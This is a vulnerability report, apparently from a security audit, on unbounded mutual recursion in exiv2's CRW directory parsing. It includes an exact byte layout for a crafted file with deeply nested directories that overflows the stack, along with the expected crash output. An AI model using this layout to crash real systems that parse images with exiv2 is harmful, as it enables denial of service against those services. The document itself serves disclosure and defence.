# VULN-001: Uncontrolled Recursion in CIFF Directory Parsing

## Summary

**CWE**: CWE-674 – Uncontrolled Recursion  
**Component**: `exiv2` – `CiffDirectory::readDirectory()` / `CiffDirectory::doRead()`  
**File**: `src/crwimage_int.cpp`, lines ~212–252  
**Trigger**: `exiv2 pr <crafted.crw>`

## Root Cause

`readDirectory` and `doRead` mutually recurse with no depth limit:

```
CiffHeader::read()
  └─ CiffDirectory::readDirectory(heap, size, bo)
       └─ [for each directory-type entry] CiffDirectory::doRead(...)
            └─ CiffComponent::doRead(...)  ← reads offset/size from entry
            └─ CiffDirectory::readDirectory(pData + offset_, size_, bo)
                 └─ [loop] ...
```

A crafted CRW file with deeply nested `CiffDirectory` entries causes unlimited
mutual recursion, exhausting the default ~8 MB thread stack.

## File Format Exploit

CRW (CIFF) format uses a heap-based directory structure:
- `readDirectory(pData, size, byteOrder)` parses the directory at `[pData, pData+size)`.
- Last 4 bytes = `o` (entry-table offset within buffer).
- `count = getUShort(pData + o)` entries follow at `pData + o + 2`.
- Each entry: `tag(2) + size_field(4) + offset_field(4)` = 10 bytes.
- If `tag & 0x3800` ∈ {`0x2800`, `0x3000`} → directory type → recurse.
- For `valueData` location (`tag & 0xC000 == 0`): sub-dir at `pData + offset_field` with size `size_field`.

## PoC Construction

All levels share `heap[0]` as their base pointer. Each level L uses the last 16 bytes
of its buffer as its entry table, pointing back to `offset=0` (before the entry):

```
Level L: buffer = heap[0 .. H-16L-1],  size = H - 16*L
         E_L = H - 16*(L+1)            (entry table start = sub-dir size)

  heap[E_L + 0..1]:   count = 1
  heap[E_L + 2..3]:   tag   = 0x2800
  heap[E_L + 4..7]:   size_field  = E_L   (sub-dir: heap[0..E_L-1])
  heap[E_L + 8..11]:  offset_field = 0
  heap[E_L + 12..15]: o_field = E_L       (points to count)

Leaf (level D): heap[0..3] = [0,0,0,0]   (o=0, count=0, no entries)
```

Enforce check passes: `offset_=0 < start=E_L+2`, check `size_=E_L <= E_L+2`. ✓

Total heap size = `4 + D × 16` bytes. With `D = 50000`:
- Heap: ~781 KB, file: ~781 KB
- Each recursion pair (readDirectory + doRead) uses ~300–800 bytes of stack (larger with ASAN)
- Total stack consumed: D × 2 × frame_size >> 8 MB → SIGSEGV

## Expected Output

```
AddressSanitizer: stack-overflow
    #0 ... CiffDirectory::readDirectory(...)
    #1 ... CiffDirectory::doRead(...)
    #2 ... CiffDirectory::readDirectory(...)
    ...
```

or a plain `SIGSEGV` with signal 11 if not ASAN-instrumented.
